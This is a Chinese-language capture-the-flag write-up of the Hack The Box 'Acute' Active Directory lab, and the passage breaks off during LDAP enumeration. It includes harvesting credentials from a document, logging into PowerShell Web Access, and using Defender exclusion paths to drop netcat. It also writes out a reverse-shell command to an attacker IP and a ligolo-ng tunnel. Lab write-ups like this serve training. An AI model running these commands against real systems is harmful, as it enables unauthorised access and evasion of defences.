            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">11</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/04/22/box-wp-Scepter/" title="【season-7】 htb Scepter wp" >
            <div class="recent-link-text">
              【season-7】 htb Scepter wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/21/ActionOPs/" title="ActionOPs" >
            <div class="recent-link-text">
              ActionOPs
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/14/Kubernetes-IngressNightmare-1/" title="「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」" >
            <div class="recent-link-text">
              「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/13/box-wp-Nocturnal/" title="【season-7】 htb Nocturnal wp" >
            <div class="recent-link-text">
              【season-7】 htb Nocturnal wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/04/box-wp-Haze/" title="【season-7】 htb Haze wp" >
            <div class="recent-link-text">
              【season-7】 htb Haze wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-Tracks-AD-Acute" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cm95uvrc2001r3gky8erbdicp">
        <img src="/wpimages/2025/tracks-ad/Acute/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Tracks-AD-Acute
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-03-13T08:35:07.000Z" itemprop="datePublished">2025-03-13</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/AD/">AD</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            50k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.10.11.145 -p- --min-rate=3000</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.145</span><br><span class="line">Host is up (1.0s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ sudo nmap -sS 10.10.11.145  -p443 -sCV --min-rate=3000    </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 22:11 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.145</span><br><span class="line">Host is up (0.58s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">| ssl-cert: Subject: commonName=atsserver.acute.local</span><br><span class="line">| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver</span><br><span class="line">| Not valid before: 2022-01-06T06:34:58</span><br><span class="line">|_Not valid after:  2030-01-04T06:34:58</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-06T02:54:15+00:00; -17m47s from scanner time.</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>


<h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><h2 id="to-edavies"><a href="#to-edavies" class="headerlink" title="to edavies"></a>to edavies</h2><p>只有一个443的web</p>
<p>从ssl的下发可以看到他dns主体走的<code>atsserver.acute.local</code>，加到hosts里</p>
<p>访问web，首页如下</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-2.png" alt="alt text"></p>
<p>这里只有about点了有反应，其他路径都没用。</p>
<p>在about页面的右上角多了个doc的下载路径</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-1.png" alt="alt text"></p>
<p>同时，往下滑能看到有一部分用户名，收集到字典。</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-3.png" alt="alt text"></p>
<p>下载doc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ wget --no-check-certificate &#x27;https://atsserver.acute.local/New_Starter_CheckList_v7.docx&#x27;</span><br><span class="line"></span><br><span class="line">https://atsserver.acute.local/New_Starter_CheckList_v7.docx</span><br><span class="line">Resolving atsserver.acute.local (atsserver.acute.local)... 10.10.11.145</span><br><span class="line">Connecting to atsserver.acute.local (atsserver.acute.local)|10.10.11.145|:443... connected.</span><br><span class="line">WARNING: The certificate of ‘atsserver.acute.local’ is not trusted.</span><br><span class="line">WARNING: The certificate of ‘atsserver.acute.local’ doesn&#x27;t have a known issuer.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 34566 (34K) [application/vnd.openxmlformats-officedocument.wordprocessingml.document]</span><br><span class="line">Saving to: ‘New_Starter_CheckList_v7.docx’</span><br><span class="line"></span><br><span class="line">New_Starter_CheckList_v7.docx                    100%[=========================================================================================================&gt;]  33.76K  --.-KB/s    in 0.03s   </span><br><span class="line"></span><br><span class="line">‘New_Starter_CheckList_v7.docx’ saved [34566/34566]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先看信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">└─$ exiftool New_Starter_CheckList_v7.docx</span><br><span class="line">ExifTool Version Number         : 13.00</span><br><span class="line">File Name                       : New_Starter_CheckList_v7.docx</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 35 kB</span><br><span class="line">File Permissions                : -rw-rw-r--</span><br><span class="line">File Type                       : DOCX</span><br><span class="line">File Type Extension             : docx</span><br><span class="line">MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document</span><br><span class="line">Zip Required Version            : 20</span><br><span class="line">Zip Bit Flag                    : 0x0006</span><br><span class="line">Zip Compression                 : Deflated</span><br><span class="line">Zip Modify Date                 : 1980:01:01 00:00:00</span><br><span class="line">Zip CRC                         : 0x079b7eb2</span><br><span class="line">Zip Compressed Size             : 428</span><br><span class="line">Zip Uncompressed Size           : 2527</span><br><span class="line">Zip File Name                   : [Content_Types].xml</span><br><span class="line">Creator                         : FCastle</span><br><span class="line">Description                     : Created on Acute-PC01</span><br><span class="line">Last Modified By                : Daniel</span><br><span class="line">Revision Number                 : 8</span><br><span class="line">Last Printed                    : 2021:01:04 15:54:00Z</span><br><span class="line">Create Date                     : 2021:12:08 14:21:00Z</span><br><span class="line">Modify Date                     : 2021:12:22 00:39:00Z</span><br><span class="line">Template                        : Normal.dotm</span><br><span class="line">Total Edit Time                 : 2.6 hours</span><br><span class="line">Pages                           : 3</span><br><span class="line">Words                           : 886</span><br><span class="line">Characters                      : 5055</span><br><span class="line">Application                     : Microsoft Office Word</span><br><span class="line">Doc Security                    : None</span><br><span class="line">Lines                           : 42</span><br><span class="line">Paragraphs                      : 11</span><br><span class="line">Scale Crop                      : No</span><br><span class="line">Heading Pairs                   : Title, 1</span><br><span class="line">Titles Of Parts                 : </span><br><span class="line">Company                         : University of Marvel</span><br><span class="line">Links Up To Date                : No</span><br><span class="line">Characters With Spaces          : 5930</span><br><span class="line">Shared Doc                      : No</span><br><span class="line">Hyperlinks Changed              : No</span><br><span class="line">App Version                     : 16.0000</span><br></pre></td></tr></table></figure>

<p>得到如下信息，创建者<code>FCastle</code>,主机名<code>Acute-PC01</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Creator                         : FCastle</span><br><span class="line">Description                     : Created on Acute-PC01</span><br></pre></td></tr></table></figure>

<p>一份培训工作相关的文档，在文档中包含一部分web路径，以及相关敏感信息等</p>
<p>这里超链接到一个web路径</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-4.png" alt="alt text"></p>
<p>这里表示，只有lois有权限更改用户权限，<strong>并只有lois可以成为<code>site admin（站点管理员）</code></strong></p>
<blockquote>
<p>Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin.</p>
</blockquote>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-6.png" alt="alt text"></p>
<p>然后其中包含了一个初始密码<code>Password1!</code></p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-7.png" alt="alt text"></p>
<p>其中<code>https://atsserver.acute.local/Acute_Staff_Access</code>访问后可以得到一个<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)">pswa</a>登录页面</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.msb365.blog/?p=353">https://www.msb365.blog/?p=353</a></p>
</blockquote>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-5.png" alt="alt text"></p>
<p>这里用之前<code>about</code>页面收集到的用户名做个字典</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> userlist                  </span><br><span class="line">Aileen Wallace</span><br><span class="line">Charlotte Hall</span><br><span class="line">Evan Davies</span><br><span class="line">Ieuan Monks</span><br><span class="line">Joshua Morgan</span><br><span class="line">Lois Hopkins</span><br><span class="line"></span><br><span class="line">└─$ ~/tools/wordlist/username-anarchy/username-anarchy -i userlist -C <span class="literal">false</span> &gt;&gt; u_wl </span><br></pre></td></tr></table></figure>

<p>然后依照<code>New_Starter_CheckList_v7.docx</code>文档创建者<code>FCastle</code>命名规则，进行筛选出类似的命名格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -E <span class="string">&#x27;[A-Z]&#123;2&#125;\w+&#x27;</span> u_wl|<span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span></span><br><span class="line">awallace</span><br><span class="line">chall</span><br><span class="line">edavies</span><br><span class="line">imonks</span><br><span class="line">jmorgan</span><br><span class="line">lhopkins</span><br><span class="line"></span><br><span class="line">└─$ grep -E <span class="string">&#x27;[A-Z]&#123;2&#125;\w+&#x27;</span> u_wl               </span><br><span class="line">AWallace</span><br><span class="line">CHall</span><br><span class="line">EDavies</span><br><span class="line">IMonks</span><br><span class="line">JMorgan</span><br><span class="line">LHopkins</span><br></pre></td></tr></table></figure>

<p>因为不知道具体的能登陆的用户有没有限制用户名大小写，所以大小写都要尝试一下。</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-8.png" alt="alt text"></p>
<p>主机名我们有两个,疑似是域控dns的<code>atsserver</code>以及创建doc文档的主机<code>Acute-PC01</code></p>
<p>所以都要尝试.</p>
<p>这里用<code>EDavies</code>登陆时弹了个报错</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-9.png" alt="alt text"> </p>
<p>然后用<code>CHall</code>时候也有个报错</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-10.png" alt="alt text"></p>
<p>神奇的是再一次用<code>EDavies</code>登录<code>Acute-PC01</code>又成功了，可能是机器的服务还没完全拉起来，在之后重启之后也出现了同样的情况。</p>
<p>所以最终登录用的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username: edavies</span><br><span class="line">Password: Password1!</span><br><span class="line"></span><br><span class="line">ComputerName: Acute-PC01</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/tracks-ad/Acute/image-11.png" alt="alt text"></p>
<p>这里进来之后弹个shell先，然后发现开了wd，我不想bypass，所以看下有没有路径被加白了.</p>
<p><code>Get-MpPreference</code>没权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Get-MpPreference | select ExclusionPath</span><br><span class="line"></span><br><span class="line">Cannot connect to CIM server. Access denied </span><br><span class="line"></span><br><span class="line">    + CategoryInfo          : ResourceUnavailable: (MSFT_MpPreference:String) [Get-MpPreference], CimJobException </span><br><span class="line"></span><br><span class="line">    + FullyQualifiedErrorId : CimJob_BrokenCimSession,Get-MpPreference </span><br></pre></td></tr></table></figure>

<p>看注册表则是有俩路径被加了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</span></span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths</span><br><span class="line"></span><br><span class="line">    C:\Utils    REG_DWORD    0x0</span><br><span class="line"></span><br><span class="line">    C:\Windows\System32    REG_DWORD    0x0</span><br></pre></td></tr></table></figure>

<p>传个nc，因为他web时不时的就断开了，弹个shell方便些。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.16.4/nc64.exe -o C:\Utils\nc64.exe</span><br></pre></td></tr></table></figure>

<p>创建shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; start-job -scriptblock &#123;C:\utils\nc64.exe 10.10.16.4 10086 -e powershell.exe&#125;</span><br><span class="line">Id     Name            PSJobTypeName   State         HasMoreData     Location             Command</span><br><span class="line">--     ----            -------------   -----         -----------     --------             -------</span><br><span class="line">1      Job1            BackgroundJob   Running       True            localhost            C:\utils\nc64.exe 10.1... </span><br></pre></td></tr></table></figure>

<p>接到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvnp 10086</span><br><span class="line">listening on [any] 10086 ...</span><br><span class="line">connect to [10.10.16.4] from (UNKNOWN) [10.10.11.145] 49785</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Try the new cross-platform PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS C:\Users\edavies\Documents&gt; </span><br></pre></td></tr></table></figure>

<h2 id="to-imonks"><a href="#to-imonks" class="headerlink" title="to imonks"></a>to imonks</h2><p>翻了下当前<code>edavies</code>在这台机器上没有什么有价值的文件</p>
<p>想看下域内信息，起了个<code>ligolo-ng</code>做代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.\agent.exe -connect 10.10.16.4:11601 -retry -ignore-cert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ ./proxy -selfcert</span><br><span class="line">WARN[0000] Using default selfcert domain &#x27;ligolo&#x27;, beware of CTI, SOC and IoC! </span><br><span class="line">WARN[0000] Using self-signed certificates               </span><br><span class="line">WARN[0000] TLS Certificate fingerprint for ligolo is: 5F755516F0FA3801926C7466A89AF488302C3C7CF2419FF3F63D03A208F94D46 </span><br><span class="line">INFO[0000] Listening on 0.0.0.0:11601                   </span><br><span class="line">    __    _             __                       </span><br><span class="line">   / /   (_)___ _____  / /___        ____  ____ _</span><br><span class="line">  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/</span><br><span class="line"> / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / </span><br><span class="line">/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  </span><br><span class="line">        /____/                          /____/   </span><br><span class="line"></span><br><span class="line">  Made in France ♥            by @Nicocha30!</span><br><span class="line">  Version: 0.7.2-alpha</span><br><span class="line"></span><br><span class="line">ligolo-ng » INFO[0118] Agent joined.                                 name=&quot;ACUTE\\edavies@Acute-PC01&quot; remote=&quot;10.10.11.145:49856&quot;</span><br><span class="line">ligolo-ng » session</span><br><span class="line">? Specify a session : 1 - ACUTE\edavies@Acute-PC01 - 10.10.11.145:49856 - 1ed0b1ae-fa1e-475d-8276-1bacd1b38e38</span><br><span class="line">[Agent : ACUTE\edavies@Acute-PC01] »  </span><br></pre></td></tr></table></figure>

<h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -H ldap://172.16.22.1  -s base</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;&gt; (default) with scope baseObject</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=acute,DC=local</span><br><span class="line">ldapServiceName: acute.local:atsserver$@ACUTE.LOCAL</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2330</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2354</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span 